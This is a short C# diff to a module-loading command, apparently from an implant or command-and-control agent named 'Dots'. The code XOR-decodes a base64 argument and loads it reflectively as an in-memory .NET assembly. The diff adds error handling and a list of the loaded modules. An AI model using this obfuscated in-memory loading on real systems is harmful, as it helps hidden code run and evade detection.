@@ -1,4 +1,6 @@
 ﻿using System;
+using System.Collections.Generic;
+using System.Linq;
 using System.Reflection;
 using Dots.Models;
 
@@ -13,12 +15,22 @@ namespace Dots.Commands
         {           
             Assembly assembly = Assembly.Load(Zor(Convert.FromBase64String(args[0]), args[1]));
 
+            List<string> loaded = new List<string>();
+
             foreach (Type type in assembly.GetExportedTypes())
             {
-                object command = Activator.CreateInstance(type);
-                DotsProperty.Commands.Add(command);
+                string full_name = type.Name;
+                try
+                {
+                    object command = Activator.CreateInstance(type);
+                    DotsProperty.Commands.Add(command);
+                    loaded.Add(full_name);
+                } catch {
+                    return loaded.Count() > 0 ? $"Failed to load {full_name}, successfully loaded {string.Join(", ", loaded)}" : $"Failed to load {full_name}";
+                }
+
             }
-            return $"Succesfully loaded {assembly.FullName} module.";
+            return $"Successfully loaded {string.Join(", ", loaded)}.";
         }
     }
 }
